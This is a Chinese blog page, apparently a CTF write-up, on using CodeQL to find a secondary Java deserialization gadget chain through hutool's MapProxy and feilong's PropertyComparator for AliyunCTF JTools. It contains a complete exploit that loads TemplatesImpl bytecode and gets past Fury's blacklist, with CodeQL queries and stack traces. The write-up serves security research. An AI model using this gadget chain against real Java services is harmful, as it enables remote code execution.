<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CodeQL查找AliyunCTF JTools中hutool的二次反序列化链 | zoiltin&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="CodeQL查找AliyunCTF JTools中hutool的二次反序列化链">
<meta name="author" content="">
<link rel="canonical" href="https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:url" content="https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
  <meta property="og:site_name" content="zoiltin&#39;s Blog">
  <meta property="og:title" content="CodeQL查找AliyunCTF JTools中hutool的二次反序列化链">
  <meta property="og:description" content="CodeQL查找AliyunCTF JTools中hutool的二次反序列化链">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-02-26T08:19:11+00:00">
    <meta property="article:modified_time" content="2025-02-26T08:19:11+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CodeQL查找AliyunCTF JTools中hutool的二次反序列化链">
<meta name="twitter:description" content="CodeQL查找AliyunCTF JTools中hutool的二次反序列化链">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://zoiltin.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CodeQL查找AliyunCTF JTools中hutool的二次反序列化链",
      "item": "https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CodeQL查找AliyunCTF JTools中hutool的二次反序列化链",
  "name": "CodeQL查找AliyunCTF JTools中hutool的二次反序列化链",
  "description": "CodeQL查找AliyunCTF JTools中hutool的二次反序列化链",
  "keywords": [
    
  ],
  "articleBody": "数据库构建 feilong\nreadme中关于安装的命令：\ngit clone https://github.com/ifeilong/feilong.git --depth 1 mvn install 根据这个写出数据库构建语句，并加上一些跳过选项：\ncodeql database create feilong-database --language=\"java\" --command=\"mvn clean -DskipTests -Drat.skip=true package\" hutool\nhutool安装要通过install.sh链接，内容如下：\n#!/bin/bash exec mvn -T 1C clean source:jar javadoc:javadoc install -Dmaven.test.skip=false -Dmaven.javadoc.skip=false 根据这个脚本内容写，把里面的Test和Doc都改成True，跳过Test和文档生成，节省时间。\ncodeql database create hutool-database --language=\"java\" --command=\"mvn -T 1C clean source:jar javadoc:javadoc package -DskipTests -Drat.skip=true -Dmaven.javadoc.skip\" feilong数据库大概5分钟就建好了，hutool可能需要十几分钟。\ncodeql不同版本可能有细微差异，要参照文档写：https://codeql.github.com/codeql-standard-libraries/java/\nGetter java.beans包下有一些操作bean的类，其中java.beans.PropertyDescriptor#getReadMethod和java.beans.PropertyDescriptor#getWriteMethod用于获取相应Getter/Setter的Method对象。根据这个写出Sink点，查找能够调用Getter的gadget：\npredicate callGetterSinks(Method method) {\rexists(MethodAccess call |\r(\rcall.getCallee().getQualifiedName().matches(\"%getReadMethod%\")\r) and call.getCaller() = method\r)\r} 对于反序列化来说还需要限制方法所在类实现了序列化接口或者是静态方法：\nimport java\rpredicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\"java.io.Serializable\") and rt.extendsOrImplements(ref) )\r}\rpredicate callGetterSinks(Method method) {\rexists(MethodAccess call |\r(\rcall.getCallee().hasQualifiedName(\"java.beans\", \"PropertyDescriptor\", \"getReadMethod\")\r) and call.getCaller() = method and (\rmethod.isStatic() or isSerializable(method.getDeclaringType())\r)\r)\r}\rfrom Method method\rwhere callGetterSinks(method)\rselect method.getQualifiedName() feilong中的结果：\ncom.feilong.core.bean.PropertyValueObtainer.getValue com.feilong.json.builder.SensitiveWordsPropertyNameAndJsonValueProcessorMapBuilder.getPropertyNamesWithAnnotation com.feilong.lib.beanutils.PropertyUtilsBean.getReadMethod com.feilong.lib.beanutils.DefaultBeanIntrospector.handleIndexedPropertyDescriptors com.feilong.lib.json.util.IsIgnoreUtil.isIgnore com.feilong.lib.ognl.OgnlRuntime.getPropertyDescriptors PropertyComparator#compare方法会调用PropertyUtilsBean#getReadMethod方法，堆栈如下：\njava.beans.PropertyDescriptor#getReadMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getReadMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare 获得getter Method后会直接invoke：PropertyUtilsBean#getSimpleProperty\nprivate static Object getSimpleProperty(Object bean, String name, PropertyDescriptor descriptor) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException { Method readMethod = getReadMethod(bean.getClass(), descriptor); if (readMethod == null) { throw new NoSuchMethodException(\"Property '\" + name + \"' has no getter method in class '\" + bean.getClass() + \"'\"); } else { return invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY); } } fury反序列化设置了黑名单，过滤了TemplatesImpl类。\ndeserialize 想找一个二次反序列化的入口，一般名字都类似于deserialize等，直接文本搜索就可以了。\ncn.hutool.core.convert.impl.BeanConverter类的convertInternal方法可以反序列化，代码如下：\nprotected T convertInternal(Object value) { ................ if (!(value instanceof Map) \u0026\u0026 !(value instanceof ValueProvider) \u0026\u0026 !BeanUtil.isBean(value.getClass())) { if (value instanceof byte[]) { return ObjectUtil.deserialize((byte[])((byte[])value), new Class[0]); ............... } cn.hutool.core.convert.AbstractConverter.convert会调用convertInternal.\n目前链子状态：\nreadObject -\u003e\rgetter -\u003e \u003c空缺\u003e -\u003e\rAbstractConverter#convert -\u003e\rObjectUtil.deserialize sink好写，直接规定能够调用AbstractConverter#convert即可：\nclass Sink extends Method{\rSink(){\rexists(MethodAccess ac| ac.getCallee().getQualifiedName().matches(\"%cn.hutool.core.convert.AbstractConverter.convert%\") and this = ac.getCaller()\r)\r}\r} source设为invokeMethod能够调用到的方法，除了以get开头的getter，还可以加上动态代理的invoke方法：\nclass Source extends Method{\rSource(){\rnot this.isStatic() and this.isPublic() and (\r( // getter\rthis.getQualifiedName().matches(\"%.get%\") and this.hasNoParameters()\r) or ( // invoke\rthis.getQualifiedName().matches(\"%.invoke\")\r)\r)\r}\r} source和sink直接的连接条件设为如下：\npredicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\"java.io.Serializable\") and rt.extendsOrImplements(ref) )\r}\rquery predicate edges(Method a, Method b) { a.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())\r} edges条件为：a调用b，且a和b为静态方法或者在实现了Serializable接口的类内。\n串联起来即可：\nimport java\rimport semmle.code.java.dataflow.FlowSources\rclass Source extends Method{\rSource(){\rnot this.isStatic() and this.isPublic() and (\r( // getter\rthis.getQualifiedName().matches(\"%.get%\") and this.hasNoParameters()\r) or ( // invoke\rthis.getQualifiedName().matches(\"%.invoke\")\r)\r)\r}\r} class Sink extends Method{\rSink(){\rexists(MethodAccess ac| ac.getCallee().getQualifiedName().matches(\"%cn.hutool.core.convert.AbstractConverter.convert%\") and this = ac.getCaller()\r)\r}\r} predicate isSerializable(RefType rt) {\rexists(RefType ref | ref.getQualifiedName().matches(\"java.io.Serializable\") and rt.extendsOrImplements(ref) )\r}\rquery predicate edges(Method a, Method b) { // a调用b，且a和b为静态方法或者在实现了Serializable接口的类内\ra.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())\r}\rfrom Source source, Sink sink\rwhere edges+(source, sink)\rselect source, source, sink, \"$@ $@ to $@ $@\" ,\rsource.getDeclaringType(),source.getDeclaringType().getName(),\rsource,source.getName(),\rsink.getDeclaringType(),sink.getDeclaringType().getName(),\rsink,sink.getName() 在hutool数据库内的查询结果如下： 底下三个JavaRuntimeInfo数据不可控，DynaBean中的invoke为静态方法，所以只有MapProxy可以用。\nMapProxy ConverterRegistry#convert能调用BeanConverter#convert，不过限制条件很多。\npublic \u003cT\u003e T convert(Type type, Object value, T defaultValue, boolean isCustomFirst) throws ConvertException { if (TypeUtil.isUnknown((Type)type) \u0026\u0026 null == defaultValue) { return value; } else if (ObjectUtil.isNull(value)) { return defaultValue; } else { if (TypeUtil.isUnknown((Type)type)) { type = defaultValue.getClass(); } if (value instanceof Opt) { value = ((Opt)value).get(); if (ObjUtil.isNull(value)) { return defaultValue; } } if (value instanceof Optional) { value = ((Optional)value).orElse((Object)null); if (ObjUtil.isNull(value)) { return defaultValue; } } if (type instanceof TypeReference) { type = ((TypeReference)type).getType(); } if (value instanceof TypeConverter) { return ObjUtil.defaultIfNull(((TypeConverter)value).convert((Type)type, value), defaultValue); } else { Converter\u003cT\u003e converter = this.getConverter((Type)type, isCustomFirst); if (null != converter) { return converter.convert(value, defaultValue); } else { Class\u003cT\u003e rowType = TypeUtil.getClass((Type)type); if (null == rowType) { if (null == defaultValue) { return value; } rowType = defaultValue.getClass(); } T result = this.convertSpecial((Type)type, rowType, value, defaultValue); if (null != result) { return result; } else if (BeanUtil.isBean(rowType)) { return (new BeanConverter((Type)type)).convert(value, defaultValue); } else { throw new ConvertException(\"Can not Converter from [{}] to [{}]\", new Object[]{value.getClass().getName(), ((Type)type).getTypeName()}); } } } } } 总结以下条件：\n被代理的接口需要定义getter 被代理的接口为public getter方法的返回值需要为Normal类（不是抽象类或接口） getter方法的返回值类型需要有setter方法。 综上写出搜索合适的Bean的脚本：\nimport java\rpredicate isSerializable(RefType rt) { // 实现Serializable接口\rexists(RefType ref | ref.getQualifiedName().matches(\"java.io.Serializable\") and rt.extendsOrImplements(ref) )\r}\rpredicate hasSetter(RefType rt) { // 具有setter方法\rexists(Method m | rt.hasMethod(m, rt) and m.getQualifiedName().regexpMatch(\".*\\\\.set[^\\\\.]+\") and m.isPublic() and m.getReturnType().getName() = \"void\" and not m.isStatic()\r)\r}\rpredicate main(RefType rt1, RefType rt2) { // rt2为rt1 getter的返回值类型\rexists( Method m | rt1.hasMethod(m, rt1) and\rm.isPublic() and m.getQualifiedName().regexpMatch(\".*\\\\.get[^\\\\.]+\") and m.getReturnType() = rt2 and m.hasNoParameters()\r)\r}\rfrom Interface sc, Class sc2 // sc为被代理接口，sc2为sc的getter的返回值类型\rwhere sc.isPublic() and main(sc, sc2) and hasSetter(sc2) and not sc2.isAbstract()\rselect sc.getQualifiedName(), sc2.getQualifiedName() 结果如下： 有84组结果，第二组就可以用。代理java.awt.Shape接口，其getter方法getBounds的返回值类型java.awt.Rectangle有setter方法。\n反序列化的字节数组是从MapProxy中获取的，具体逻辑在MapProxy#invoke中。\nPOC如下：\nTemplates templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{getEvilClass()}); setFieldValue(templates,\"_class\",null); setFieldValue(templates,\"_name\",\"asd\"); PriorityQueue\u003cObject\u003e tmpqueue = new PriorityQueue\u003c\u003e(2); tmpqueue.add(1); tmpqueue.add(1); Object[] tmpobjects = (Object[]) getFieldValue(tmpqueue, \"queue\"); tmpobjects[0] = templates; // 指定getter 为getOutputProperties Comparator\u003c?\u003e tmpcomparator = (Comparator\u003c?\u003e) new PropertyComparator(\"outputProperties\"); setFieldValue(tmpqueue, \"comparator\", tmpcomparator); HashMap map = new HashMap(); map.put(\"bounds\", ser(tmpqueue)); // 写入序列化数据 MapProxy mapProxy = new MapProxy(map); Shape b = (Shape) Proxy.newProxyInstance( // 代理Shape ClassLoader.getSystemClassLoader(), new Class[]{Shape.class}, mapProxy); b.getBounds(); 调用Shape#getBounds即可触发反序列化加载字节码。\n拼接起来 public class Exp { public static void main(String[] args) throws Exception{ Templates templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{getEvilClass()}); setFieldValue(templates,\"_class\",null); setFieldValue(templates,\"_name\",\"asd\"); PriorityQueue\u003cObject\u003e tmpqueue = new PriorityQueue\u003c\u003e(2); tmpqueue.add(1); tmpqueue.add(1); Object[] tmpobjects = (Object[]) getFieldValue(tmpqueue, \"queue\"); tmpobjects[0] = templates; Comparator\u003c?\u003e tmpcomparator = (Comparator\u003c?\u003e) new PropertyComparator(\"outputProperties\"); setFieldValue(tmpqueue, \"comparator\", tmpcomparator); HashMap map = new HashMap(); map.put(\"bounds\", ser(tmpqueue)); MapProxy mapProxy = new MapProxy(map); Shape b = (Shape) Proxy.newProxyInstance( ClassLoader.getSystemClassLoader(), new Class[]{Shape.class}, mapProxy); PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003c\u003e(2); queue.add(1); queue.add(1); Object[] objects = (Object[]) getFieldValue(queue, \"queue\"); objects[1] = b; // 这里顺序和上面template处不同，都是要保证可以类先被调用getter。 // 指定getter 为 getBounds Comparator\u003c?\u003e comparator = (Comparator\u003c?\u003e) new PropertyComparator(\"bounds\"); setFieldValue(queue, \"comparator\", comparator); Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build(); byte[] data = fury.serialize(queue); System.out.println(Base64.getEncoder().encodeToString(data)); } } 堆栈：\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare\rjava.util.PriorityQueue#siftDownUsingComparator\rjava.util.PriorityQueue#siftDown\rjava.util.PriorityQueue#heapify\rjava.util.PriorityQueue#readObject\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rjava.io.ObjectStreamClass#invokeReadObject\rjava.io.ObjectInputStream#readSerialData\rjava.io.ObjectInputStream#readOrdinaryObject\rjava.io.ObjectInputStream#readObject0\rjava.io.ObjectInputStream#readObject\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.io.IoUtil#readObj\rcn.hutool.core.util.SerializeUtil#deserialize\rcn.hutool.core.util.ObjectUtil#deserialize\rcn.hutool.core.convert.impl.BeanConverter#convertInternal\rcn.hutool.core.convert.AbstractConverter#convert\rcn.hutool.core.convert.ConverterRegistry#convert\rcn.hutool.core.convert.ConverterRegistry#convert\rcn.hutool.core.convert.Convert#convertWithCheck\rcn.hutool.core.convert.Convert#convert\rcn.hutool.core.convert.Convert#convert\rcn.hutool.core.map.MapProxy#invoke\rcom.sun.proxy.$Proxy0#getBounds\rsun.reflect.NativeMethodAccessorImpl#invoke0\rsun.reflect.NativeMethodAccessorImpl#invoke\rsun.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty\rcom.feilong.lib.beanutils.PropertyUtilsBean#getProperty\rcom.feilong.lib.beanutils.PropertyUtils#getProperty\rcom.feilong.core.bean.PropertyValueObtainer#getDataUseApache\rcom.feilong.core.bean.PropertyValueObtainer#obtain\rcom.feilong.core.bean.PropertyUtil#getProperty\rcom.feilong.core.util.comparator.PropertyComparator#compare\rjava.util.PriorityQueue#siftUpUsingComparator\rjava.util.PriorityQueue#siftUp\rjava.util.PriorityQueue#offer\rjava.util.PriorityQueue#add\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#readDifferentTypeElements\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#generalJavaRead\rorg.apache.fury.serializer.collection.AbstractCollectionSerializer#readElements\rorg.apache.fury.serializer.collection.CollectionSerializer#read\rorg.apache.fury.serializer.collection.CollectionSerializer#read\rorg.apache.fury.Fury#readDataInternal\rorg.apache.fury.Fury#readRef\rorg.apache.fury.Fury#deserialize\rorg.apache.fury.Fury#deserialize ",
  "wordCount" : "919",
  "inLanguage": "en",
  "datePublished": "2025-02-26T08:19:11Z",
  "dateModified": "2025-02-26T08:19:11Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://zoiltin.github.io/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "zoiltin's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://zoiltin.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://zoiltin.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://zoiltin.github.io/about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CodeQL查找AliyunCTF JTools中hutool的二次反序列化链
    </h1>
    <div class="post-description">
      CodeQL查找AliyunCTF JTools中hutool的二次反序列化链
    </div>
    <div class="post-meta"><span title='2025-02-26 08:19:11 +0000 UTC'>February 26, 2025</span>&nbsp;·&nbsp;5 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%9e%84%e5%bb%ba" aria-label="数据库构建">数据库构建</a></li>
                <li>
                    <a href="#getter" aria-label="Getter">Getter</a></li>
                <li>
                    <a href="#deserialize" aria-label="deserialize">deserialize</a></li>
                <li>
                    <a href="#mapproxy" aria-label="MapProxy">MapProxy</a></li>
                <li>
                    <a href="#%e6%8b%bc%e6%8e%a5%e8%b5%b7%e6%9d%a5" aria-label="拼接起来">拼接起来</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="数据库构建">数据库构建<a hidden class="anchor" aria-hidden="true" href="#数据库构建">#</a></h1>
<p><strong>feilong</strong></p>
<p><a href="https://github.com/ifeilong/feilong/blob/master/README.md">readme</a>中关于安装的命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/ifeilong/feilong.git --depth <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>mvn install
</span></span></code></pre></div><p>根据这个写出数据库构建语句，并加上一些跳过选项：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>codeql database create feilong-database --language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java&#34;</span> --command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mvn clean -DskipTests -Drat.skip=true package&#34;</span>
</span></span></code></pre></div><p><strong>hutool</strong></p>
<p>hutool安装要通过<code>install.sh</code><a href="https://github.com/chinabugotech/hutool/blob/v5-master/bin/install.sh">链接</a>，内容如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>exec mvn -T 1C clean source:jar javadoc:javadoc install -Dmaven.test.skip<span style="color:#f92672">=</span>false -Dmaven.javadoc.skip<span style="color:#f92672">=</span>false
</span></span></code></pre></div><p>根据这个脚本内容写，把里面的Test和Doc都改成True，跳过Test和文档生成，节省时间。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>codeql database create hutool-database --language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java&#34;</span> --command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mvn -T 1C clean source:jar javadoc:javadoc package -DskipTests -Drat.skip=true -Dmaven.javadoc.skip&#34;</span>
</span></span></code></pre></div><p>feilong数据库大概5分钟就建好了，hutool可能需要十几分钟。</p>
<p>codeql不同版本可能有细微差异，要参照文档写：https://codeql.github.com/codeql-standard-libraries/java/</p>
<h1 id="getter">Getter<a hidden class="anchor" aria-hidden="true" href="#getter">#</a></h1>
<p><code>java.beans</code>包下有一些操作bean的类，其中<code>java.beans.PropertyDescriptor#getReadMethod</code>和<code>java.beans.PropertyDescriptor#getWriteMethod</code>用于获取相应<code>Getter/Setter</code>的Method对象。根据这个写出Sink点，查找能够调用Getter的gadget：</p>
<pre tabindex="0"><code>predicate callGetterSinks(Method method) {
    exists(MethodAccess call |
        (
            call.getCallee().getQualifiedName().matches(&#34;%getReadMethod%&#34;)
        ) and 
        call.getCaller() = method
    )
}
</code></pre><p>对于反序列化来说还需要限制方法所在类实现了序列化接口或者是静态方法：</p>
<pre tabindex="0"><code>import java

predicate isSerializable(RefType rt) {
    exists(RefType ref | 
        ref.getQualifiedName().matches(&#34;java.io.Serializable&#34;) and 
        rt.extendsOrImplements(ref)    
    )
}

predicate callGetterSinks(Method method) {
    exists(MethodAccess call |
        (
            call.getCallee().hasQualifiedName(&#34;java.beans&#34;, &#34;PropertyDescriptor&#34;, &#34;getReadMethod&#34;)
        ) and 
        call.getCaller() = method and (
            method.isStatic() or 
            isSerializable(method.getDeclaringType())
        )
    )
}

from Method method
where callGetterSinks(method)
select method.getQualifiedName()
</code></pre><p>feilong中的结果：</p>
<ol>
<li><code>com.feilong.core.bean.PropertyValueObtainer.getValue</code></li>
<li><code>com.feilong.json.builder.SensitiveWordsPropertyNameAndJsonValueProcessorMapBuilder.getPropertyNamesWithAnnotation</code></li>
<li><code>com.feilong.lib.beanutils.PropertyUtilsBean.getReadMethod</code></li>
<li><code>com.feilong.lib.beanutils.DefaultBeanIntrospector.handleIndexedPropertyDescriptors</code></li>
<li><code>com.feilong.lib.json.util.IsIgnoreUtil.isIgnore</code></li>
<li><code>com.feilong.lib.ognl.OgnlRuntime.getPropertyDescriptors</code></li>
</ol>
<p><code>PropertyComparator#compare</code>方法会调用<code>PropertyUtilsBean#getReadMethod</code>方法，堆栈如下：</p>
<pre tabindex="0"><code>java.beans.PropertyDescriptor#getReadMethod
com.feilong.lib.beanutils.PropertyUtilsBean#getReadMethod
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getProperty
com.feilong.lib.beanutils.PropertyUtils#getProperty
com.feilong.core.bean.PropertyValueObtainer#getDataUseApache
com.feilong.core.bean.PropertyValueObtainer#obtain
com.feilong.core.bean.PropertyUtil#getProperty
com.feilong.core.util.comparator.PropertyComparator#compare
</code></pre><p>获得getter Method后会直接invoke：<code>PropertyUtilsBean#getSimpleProperty</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getSimpleProperty</span>(Object bean, String name, PropertyDescriptor descriptor) <span style="color:#66d9ef">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException {
</span></span><span style="display:flex;"><span>    Method readMethod <span style="color:#f92672">=</span> getReadMethod(bean.<span style="color:#a6e22e">getClass</span>(), descriptor);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (readMethod <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">&#34;Property &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; has no getter method in class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
